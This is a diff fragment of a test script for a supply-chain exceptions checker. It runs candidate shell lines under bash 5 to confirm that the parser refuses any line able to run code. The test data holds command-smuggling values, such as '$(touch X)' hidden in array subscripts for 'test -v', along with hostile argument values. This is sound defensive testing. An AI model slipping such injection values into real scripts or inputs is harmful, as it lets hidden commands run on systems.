+                subprocess.run([b5, "-c", 't() { shift 2; "$@"; }\n' + line], cwd=d, env=env, stdin=subprocess.DEVNULL, capture_output=True, timeout=20)
+            except subprocess.TimeoutExpired:
+                pass
+            return os.path.exists(mark)
+        plain = run(d, os.path.join(d, "calls"), "x")
+        hostile = [h for h in HOSTILE if run(h, h, h)]
+        verdict = subprocess.run([sys.executable, hfpy, line], capture_output=True, text=True, stdin=subprocess.DEVNULL)
+        out["lines"].append({"kind": kind, "what": what, "marked": plain, "marked_hostile": hostile,
+                             "refused": verdict.returncode == 1 and verdict.stdout.startswith("refused: "),
+                             "accepted": verdict.returncode == 0 and verdict.stdout.startswith("harness assertion")})
+json.dump(out, open(os.path.join(w, "hf-run.json"), "w"), indent=1)
+PY
+python3 "$work/hf_run.py" "$work/harness_form.py" "$work" </dev/null
+hfr() { python3 - "$work/hf-run.json" "$1" <<'PY'
+import json, sys
+r = json.load(open(sys.argv[1])); L = r["lines"]; m = sys.argv[2]
+assert r["bash5"], "no bash 5 on PATH"
+if m == "marked-refused": bad = [x["what"] for x in L if (x["marked"] or x["marked_hostile"]) and not x["refused"]]
+elif m == "accepted-clean": bad = [x["what"] for x in L if (x["kind"] in ("accepted", "real")) and (x["marked"] or x["marked_hostile"] or not x["accepted"] and x["kind"] == "accepted")]; assert sum(x["kind"] == "real" for x in L) == 7
+elif m == "repros-mark":
+    bad = [x["what"] for x in L if x["what"].startswith(("Sonnet R1 reproduction", "test -v \"a[$(touch X)]\"", "[ -v \"x[$(cmd)]\" ]")) and not x["marked"]]
+    bad += [x["what"] for x in L if x["what"].startswith("Codex R1 reproduction") and not x["marked_hostile"]]
+    assert sum(x["what"].startswith(("Sonnet R1 reproduction", "Codex R1 reproduction")) for x in L) == 3
+print(sum(bool(x["marked"] or x["marked_hostile"]) for x in L), "of", len(L), "corpus lines wrote the marker (plain or hostile argument values); bad:", bad)
+assert not bad, bad
+PY
+}
+CASE="AC16 harness runtime: a bash of version 5 or newer is on PATH (the runtime proof needs it)"
+check python3 -c "import json,sys; assert json.load(open(sys.argv[1]))['bash5']" "$work/hf-run.json"
+CASE="AC16 harness runtime: the planted reproductions (newline in the body, test -v / [ -v with a \$(...) subscript; Codex: a double-quoted body run with a quote-carrying \$CALLS) DO write the marker under bash 5: the harness detects a run"
+check hfr repros-mark
+CASE="AC16 harness runtime: every corpus line that wrote the marker when run is refused by the parser"
+check hfr marked-refused
+CASE="AC16 harness runtime: every accepted line (the corpus and the seven distinct committed real lines) runs under bash 5 and writes no marker, with plain paths AND with \$work, \$CALLS and \$u set to quote-, substitution- and subscript-carrying values"
+check hfr accepted-clean
+hfr marked-refused >"$work/hf-run.summary" 2>&1 || true; cat "$work/hf-run.summary"
 CASE="every committed row's line is harmless in any shell context: the test holds each line's text, its hashes match the row, and read as shell it is a comment, a syntax error (Python source), or only echo/printf/tee/cat/exit/fi with no substitution, or a harness assertion line that harness_form.py accepts"
 check python3 - "$root/.github/supply-chain-exceptions.json" "$work/harness_form.py" <<'PY'
 import hashlib, json, re, shlex, subprocess, sys
@@ -1302,13 +1525,13 @@ LINES = {   # key -> the flattened line of pull request 271 (be20423) the row is
     "2d6db92689368ed6": "# url characters, curl flags and caps",
     "bd58928b6ad7d1e1": "# the live melange resolution moves busybox to 9.9.9-r0: a copy of the live melange lock with that version, and the new apk in the live archive/curl dir",
     "e40f62c4290cc6dc": "# ---- P3 review round 2 (Sonnet extras): pointer, certified.txt shape, index tied to the locks, datahash, ranges, curl flags, openssl -----------------------------",
-    # a harness assertion line (the second allowed form): t, a quoted rule and title, one bash -c body in the fixed vocabulary
-    "b71ad6f34d750f1e": "t \"rule 32\" \"refresh: the url '$u' (a character outside the plain set) is refused (exit 2), never fetched\" bash -c \"test \\\"\\$(cat '$work/rc')\\\" = 2 && ! grep -E '^curl .*tzdata' '$CALLS'\"",
-    "3cc2fca98203f62a": "t \"rule 32\" \"refresh: every curl call is HTTPS-only with TLS 1.2 or newer (--proto =https --tlsv1.2)\" bash -c \"grep '^curl ' '$CALLS' | grep -vq -- '--proto =https --tlsv1.2' && exit 1; test \\\"\\$(grep -c '^curl ' '$CALLS')\\\" -ge 3\"",
-    "789c91f5f3c20cc7": "t \"rule 32\" \"refresh: every curl call is HTTPS-only with TLS 1.2 or newer (--proto =https --tlsv1.2)\" bash -c \"grep '^curl ' '$CALLS' | grep -vq -- '--proto =https --tlsv1.2' && exit 1; test \\\"\\$(grep -c '^curl ' '$CALLS')\\\" -ge 3\"",
-    "3e4580070a7cb0f0": "t \"rule 32\" \"refresh compares the live Wolfi key to the archived one on every run (even when nothing changed)\" bash -c \"test \\\"\\$(cat '$work/rc')\\\" = 0 && grep -Eq '^curl .*https://packages\\.wolfi\\.dev/os/.*wolfi-signing\\.rsa\\.pub' '$CALLS'\"",
-    "6fc127ab64f06952": "t \"rule 32\" \"refresh: every package and index download is globoff (-g), size-capped (--max-filesize) and time-capped (--max-time)\" bash -c \"grep '^curl ' '$CALLS' | grep -E 'tzdata|APKINDEX' | grep -v -E -- '(-g|--globoff).*--max-filesize|--max-filesize.*(-g|--globoff)' | grep -q . && exit 1; grep '^curl ' '$CALLS' | grep -E 'tzdata|APKINDEX' | grep -q -- '--max-time'\"",
-    "fab798246fb142d6": "t \"rule 32\" \"refresh: every package and index download is globoff (-g), size-capped (--max-filesize) and time-capped (--max-time)\" bash -c \"grep '^curl ' '$CALLS' | grep -E 'tzdata|APKINDEX' | grep -v -E -- '(-g|--globoff).*--max-filesize|--max-filesize.*(-g|--globoff)' | grep -q . && exit 1; grep '^curl ' '$CALLS' | grep -E 'tzdata|APKINDEX' | grep -q -- '--max-time'\"",
+    # harness assertion lines (the second allowed form): t, a quoted rule and title, one single-quoted bash -c body in the fixed vocabulary, _ and path arguments
+    "d06b3645a61e8513": "t \"rule 32\" \"refresh: every curl call is HTTPS-only with TLS 1.2 or newer (--proto =https --tlsv1.2)\" bash -c 'grep \"^curl \" \"$1\" | grep -vq -- \"--proto =https --tlsv1.2\" && exit 1; test \"$(grep -c \"^curl \" \"$1\")\" -ge 3' _ \"$CALLS\"",
+    "d49076bd54b51a9d": "t \"rule 32\" \"refresh: every curl call is HTTPS-only with TLS 1.2 or newer (--proto =https --tlsv1.2)\" bash -c 'grep \"^curl \" \"$1\" | grep -vq -- \"--proto =https --tlsv1.2\" && exit 1; test \"$(grep -c \"^curl \" \"$1\")\" -ge 3' _ \"$CALLS\"",
+    "0d1a60b407af424e": "t \"rule 32\" \"refresh: every package and index download is globoff (-g), size-capped (--max-filesize) and time-capped (--max-time)\" bash -c 'grep \"^curl \" \"$1\" | grep -E \"tzdata|APKINDEX\" | grep -v -E -- \"(-g|--globoff).*--max-filesize|--max-filesize.*(-g|--globoff)\" | grep -q . && exit 1; grep \"^curl \" \"$1\" | grep -E \"tzdata|APKINDEX\" | grep -q -- \"--max-time\"' _ \"$CALLS\"",
+    "eff84a7dd0088415": "t \"rule 32\" \"refresh: every package and index download is globoff (-g), size-capped (--max-filesize) and time-capped (--max-time)\" bash -c 'grep \"^curl \" \"$1\" | grep -E \"tzdata|APKINDEX\" | grep -v -E -- \"(-g|--globoff).*--max-filesize|--max-filesize.*(-g|--globoff)\" | grep -q . && exit 1; grep \"^curl \" \"$1\" | grep -E \"tzdata|APKINDEX\" | grep -q -- \"--max-time\"' _ \"$CALLS\"",
+    "f9eaea7a39f58987": "t \"rule 32\" \"refresh: the url '$u' (a character outside the plain set) is refused (exit 2), never fetched\" bash -c 'test \"$(cat \"$1\")\" = 2 && ! grep -E \"^curl .*tzdata\" \"$2\"' _ \"$work/rc\" \"$CALLS\"",
+    "2c19bb4de480a2f0": "t \"rule 32\" \"refresh compares the live Wolfi key to the archived one on every run (even when nothing changed)\" bash -c 'test \"$(cat \"$1\")\" = 0 && grep -Eq \"^curl .*https://packages\\.wolfi\\.dev/os/.*wolfi-signing\\.rsa\\.pub\" \"$2\"' _ \"$work/rc\" \"$CALLS\"",
 }
 SAFE = {"echo", "printf", "tee", "cat", "exit", "fi"}
 rows = json.load(open(sys.argv[1]))["unmeasured_text"]
